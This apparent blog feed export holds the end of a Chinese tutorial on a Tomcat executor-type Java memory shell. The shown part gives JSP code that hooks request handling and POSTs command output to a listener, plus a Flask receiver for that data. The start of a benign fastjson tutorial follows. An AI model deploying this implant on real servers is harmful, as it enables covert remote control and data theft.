&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                        <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">ArrayList</span> <span class="variable">objects</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                                    <span class="keyword">for</span> (Object tmp_object : objects) &#123;</span><br><span class="line">                                        <span class="type">RequestInfo</span> <span class="variable">request</span> <span class="operator">=</span> (RequestInfo) tmp_object;</span><br><span class="line">                                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(request, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                        <span class="keyword">if</span>(sendPostRequest(<span class="string">&quot;http://127.0.0.1:8085&quot;</span>, res))&#123;</span><br><span class="line">                                            response.addHeader(<span class="string">&quot;Result&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">                                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                            response.addHeader(<span class="string">&quot;Result&quot;</span>, <span class="string">&quot;failed&quot;</span>);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">sendPostRequest</span><span class="params">(String urlString, <span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlString);</span><br><span class="line">                <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">                connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">                connection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">                connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                connection.setRequestProperty(<span class="string">&quot;Content-Length&quot;</span>, String.valueOf(data.length));</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> connection.getOutputStream()) &#123;</span><br><span class="line">                    outputStream.write(data);</span><br><span class="line">                    outputStream.flush();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">responseCode</span> <span class="operator">=</span> connection.getResponseCode();</span><br><span class="line">                    <span class="keyword">return</span> responseCode == HttpURLConnection.HTTP_OK;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            getRequest(command);</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getStandardService();</span><br><span class="line">    <span class="type">ThreadPoolExecutor</span> <span class="variable">exec</span> <span class="operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="string">&quot;executor&quot;</span>);</span><br><span class="line">    <span class="type">threadexcutor</span> <span class="variable">exe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());</span><br><span class="line">    nioEndpoint.setExecutor(exe);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>先开启监听：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202184234403.png"></p><p>然后发送两次数据包，第一次是为了访问<code>888.jsp</code>，第二次是为了执行命令：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193456383.png"></p><p>可以看到数据已经传输过来了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193525085.png"></p><p>当然，用<code>yakit</code>自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以<code>python</code>自己写一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/postendpoint&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_post_request</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Received data:&quot;</span>, request.data.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No data received&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>然后修改<code>jsp</code>代码中的<code>url</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194338906.png"></p><p>最后效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194418057.png"></p><h1 id="六、致谢"><a href="#六、致谢" class="headerlink" title="六、致谢"></a>六、致谢</h1><p>我在学习Java内存马的过程中阅读参考引用了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出，以表我诚挚的谢意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/634697114</span><br><span class="line">https://blog.csdn.net/shelter1234567/article/details/133435490</span><br><span class="line">https://xz.aliyun.com/t/12494</span><br><span class="line">https://xz.aliyun.com/t/7348</span><br><span class="line">https://xz.aliyun.com/t/7388</span><br><span class="line">https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/</span><br><span class="line">https://chenlvtang.top/2022/06/22/Tomcat之Filter内存马/</span><br><span class="line">https://drun1baby.top/2022/08/22/Java内存马系列-03-Tomcat-之-Filter-型内存马/</span><br><span class="line">https://www.jb51.net/article/167204.htm</span><br><span class="line">https://f4de-bak.github.io/pages/10060c/</span><br><span class="line">https://tyaoo.github.io/2021/12/06/Tomcat内存马/</span><br><span class="line">https://github.com/bitterzzZZ/MemoryShellLearn/tree/main</span><br><span class="line">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</span><br><span class="line">https://yzddmr6.com/posts/tomcat-context/</span><br><span class="line">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</span><br><span class="line">https://gv7.me/articles/2020/kill-java-web-filter-memshell/</span><br><span class="line">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</span><br><span class="line">https://xz.aliyun.com/t/9914</span><br><span class="line">https://goodapple.top/archives/1355</span><br><span class="line">https://su18.org/post/memory-shell/</span><br><span class="line">https://nosec.org/home/detail/5049.html</span><br><span class="line">https://su18.org/post/memory-shell/#控制器-拦截器-管道</span><br><span class="line">https://su18.org/post/memory-shell-2/#延伸线程型内存马</span><br><span class="line">https://javasec.org/</span><br><span class="line">https://www.cnblogs.com/javammc/p/15612780.html</span><br><span class="line">https://landgrey.me/blog/12/</span><br><span class="line">https://landgrey.me/blog/19/</span><br><span class="line">https://www.cnblogs.com/zpchcbd/p/15545773.html</span><br><span class="line">https://xz.aliyun.com/t/11039</span><br><span class="line">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/inject-interceptor-hide-webshell/inject-interceptor-hide-webshell.md</span><br><span class="line">https://www.cnblogs.com/bitterz/p/14859766.html</span><br><span class="line">https://www.javasec.org/javaweb/MemoryShell/</span><br><span class="line">https://www.yongsheng.site/2022/06/18/内存马(二)/</span><br><span class="line">https://segmentfault.com/a/1190000040939157</span><br><span class="line">https://developer.aliyun.com/article/925400</span><br><span class="line">https://su18.org/post/memory-shell/</span><br><span class="line">https://forum.butian.net/share/2593</span><br><span class="line">https://xz.aliyun.com/t/12952</span><br><span class="line">https://www.0kai0.cn/?p=321</span><br><span class="line">https://xz.aliyun.com/t/11331</span><br><span class="line">https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</span><br><span class="line">https://cloud.tencent.com/developer/article/1888001</span><br><span class="line">https://blog.csdn.net/qq_41048524/article/details/131534948</span><br><span class="line">https://blog.csdn.net/weixin_45505313/article/details/103257933</span><br><span class="line">https://xz.aliyun.com/t/10372</span><br><span class="line">https://www.anquanke.com/post/id/224698</span><br><span class="line">https://forum.butian.net/share/2436</span><br><span class="line">http://124.223.185.138/index.php/archives/28.html</span><br><span class="line">https://longlone.top/安全/java/java安全/内存马/Tomcat-Valve型/</span><br><span class="line">https://su18.org/post/memory-shell/#tomcat-valve-内存马</span><br><span class="line">https://www.freebuf.com/articles/web/344321.html</span><br><span class="line">https://nosec.org/home/detail/5077.html</span><br><span class="line">https://github.com/veo/wsMemShell</span><br><span class="line">https://veo.pub/2022/memshell/</span><br><span class="line">https://tttang.com/archive/1673/</span><br><span class="line">https://www.viewofthai.link/2022/07/20/value型内存马/</span><br><span class="line">https://jiwo.org/ken/detail.php?id=3147</span><br><span class="line">https://paoka1.top/2023/04/24/Tomcat-Agent-型内存马/</span><br><span class="line">https://www.anquanke.com/post/id/225870</span><br><span class="line">https://xz.aliyun.com/t/11988</span><br><span class="line">https://www.cnblogs.com/piaomiaohongchen/p/14992056.html</span><br><span class="line">https://blog.csdn.net/text2204/article/details/129307931</span><br><span class="line">https://xz.aliyun.com/t/13024</span><br><span class="line">https://www.cnblogs.com/coldridgeValley/p/5816414.html</span><br><span class="line">http://wjlshare.com/archives/1541</span><br><span class="line">https://cloud.tencent.com/developer/article/2278400</span><br><span class="line">https://www.freebuf.com/vuls/345119.html</span><br><span class="line">https://tttang.com/archive/1709/</span><br><span class="line">https://xz.aliyun.com/t/11593</span><br><span class="line">https://xz.aliyun.com/t/11613</span><br><span class="line">https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor</span><br><span class="line">https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade</span><br><span class="line">https://github.com/Gh0stF/trojan-eye/tree/master</span><br><span class="line">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</span><br><span class="line">https://xz.aliyun.com/t/12949</span><br><span class="line">https://paoka1.top/2023/04/21/Tomcat-WebSocket-型内存马/</span><br><span class="line">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://socialify.git.ci/W01fh4cker/LearnJavaMemshellFromZero/image?description=1&amp;descriptionEditable=%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E5%AE%8C%E5%85%A8%E9%9B%B6%E5%9F%BA%E7%A1%80%E4%BB%8E0%E5%88%B01%E6%8E%8C%E6%8F%A1Java%E5%86%85%E5%AD%98%E9%A9%AC&amp;forks=1&amp;issues=1&amp;language=1&amp;logo=https://s2.loli.net/2022/06/25/gUAh2V5CiD96y8G.jpg&amp;owner=1&amp;pattern=Brick%20Wall&amp;pulls=1&amp;stargazers=1&quot;&gt; &lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://w01fh4cker.github.io/tags/Java/"/>
    
    <category term="Memshell" scheme="https://w01fh4cker.github.io/tags/Memshell/"/>
    
  </entry>
  
  <entry>
    <title>零基础学fastjson漏洞（基础篇）</title>
    <link href="https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/"/>
    <id>https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/</id>
    <published>2024-12-30T06:04:53.000Z</published>
    <updated>2024-12-30T07:08:17.605Z</updated>
    
    <content type="html"><![CDATA[<p>​我在学习<code>Java</code>漏洞的时候，感觉很痛苦，不知道从何学起，因为我的<code>Java</code>基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问<code>chatgpt</code>以及问<code>Java</code>安全大牛师傅们，于是就有了这一系列的文章。<br>​本文作为<code>Java</code>安全亲妈级零基础教程的第一篇<code>Fastjson</code>漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文除去代码一共近<code>11000</code>字，配图<code>108</code>张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究<code>Fastjson</code>的其他<code>payload</code>和<code>Fastjson</code>的不出网利用上，会在下一次更新。<br>​我在学习<code>Fastjson</code>相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不觉。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！<br>​在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。<br>​本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！  </p><span id="more"></span><h1 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h1><h2 id="1-fastjson怎么用？"><a href="#1-fastjson怎么用？" class="headerlink" title="1. fastjson怎么用？"></a>1. fastjson怎么用？</h2><p><code>fastjson</code>是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用<code>fastjson</code>。我们分为以下几个步骤来进行：</p><h3 id="（1）在IDEA中新建一个maven项目，并引入fastjson依赖"><a href="#（1）在IDEA中新建一个maven项目，并引入fastjson依赖" class="headerlink" title="（1）在IDEA中新建一个maven项目，并引入fastjson依赖"></a>（1）在IDEA中新建一个maven项目，并引入fastjson依赖</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810150808-505a54f9-7b81-4e4f-9633-fd72986c7a23.png#averageHue=%233f4956&clientId=u5a3e9323-ecb0-4&from=paste&height=134&id=uae782e2e&name=image.png&originHeight=167&originWidth=715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17956&status=done&style=none&taskId=ud8efe4aa-6e39-4404-8036-eae240fa0f3&title=&width=572" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810171469-292f969d-495e-41a9-b3a0-4ac11ff8b11f.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=ud692157b&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60694&status=done&style=none&taskId=ucd608cff-9d5f-44fc-b9b8-b0f63eb6458&title=&width=800" alt="image.png"><br>选择<code>Maven</code>，然后给随便取个名字，例如我起名<code>fastjson_research</code>。<br>然后在pom.xml这里的末尾，添加如下内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.50</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810256002-2cb3c874-f77d-44a9-b839-b16988e377d2.png#averageHue=%237b7752&clientId=u5a3e9323-ecb0-4&from=paste&height=674&id=u151de80a&name=image.png&originHeight=843&originWidth=1727&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140235&status=done&style=none&taskId=u3b3be4c0-bfcc-4c3c-a25d-a10a46cfc22&title=&width=1381.6" alt="image.png"><br>具体<code>Maven</code>的各个依赖的详细信息我们可以在这个网站上面查得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50</span><br></pre></td></tr></table></figure><p>然后点击右侧的<code>Maven</code>，然后点击<code>Reload All Maven Projects</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810581918-9de49706-1559-4e51-9215-eb23ef031648.png#averageHue=%2353705c&clientId=u5a3e9323-ecb0-4&from=paste&height=815&id=u0144c4c9&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156019&status=done&style=none&taskId=u98e35746-75e0-4867-b5fb-47a0cea9080&title=&width=1536" alt="image.png"></p><h3 id="（2）一个简单的demo"><a href="#（2）一个简单的demo" class="headerlink" title="（2）一个简单的demo"></a>（2）一个简单的demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后输出结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850073066-4c9b9608-3eba-47d8-acdf-10d415adb5ff.png#averageHue=%23706d58&clientId=u5a3e9323-ecb0-4&from=paste&height=771&id=u744eef74&name=image.png&originHeight=964&originWidth=1406&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=138066&status=done&style=none&taskId=u47b99af9-a647-40f2-a2cd-181095a4ff2&title=&width=1124.8" alt="image.png"><br>通过以上代码我们可以看到，我们定义了一个<code>Person</code>类，并设置了两个属性<code>age</code>以及<code>name</code>，以及简单定义了四个方法。<br>我们通过<code>Person person = new Person(&quot;Alice&quot;, 18);</code>来初始化对象，再通过<code>String jsonString = JSON.toJSONString(person);</code>去把对象转化为<code>json</code>字符串，非常方便快捷；完事之后，我们又可以通过<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>把<code>json</code>字符串转换为<code>Java</code>对象，非常简单快捷。</p><h3 id="（3）更进一步改动理解上述demo代码"><a href="#（3）更进一步改动理解上述demo代码" class="headerlink" title="（3）更进一步改动理解上述demo代码"></a>（3）更进一步改动理解上述demo代码</h3><p>其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。</p><h4 id="①问题1：Person-person2-JSON-parseObject-jsonString2-Person-class-这里为什么可以直接使用Person-class来进行映射？"><a href="#①问题1：Person-person2-JSON-parseObject-jsonString2-Person-class-这里为什么可以直接使用Person-class来进行映射？" class="headerlink" title="①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？"></a>①问题1：<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>这里为什么可以直接使用<code>Person.class</code>来进行映射？</h4><p>在使用<code>fastjson</code>时，我们需要先将<code>JSON</code>字符串和<code>Java</code>对象之间建立映射关系，可以通过类的属性和<code>JSON</code>字段名进行映射。在我们上面的代码中，<code>Java</code>类的属性名和<code>JSON</code>字段名是相同的，因此可以直接使用<code>Person.class</code>来进行映射。<br><strong>如果不同我们该怎么办？</strong><br>我们可以通过使用注解来指定它们之间的映射关系。在<code>fastjson</code>中，可以使用<code>@JSONField</code>注解来指定<code>Java</code>类的属性和<code>JSON</code>字段之间的映射关系。请看以下<code>demo</code>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span 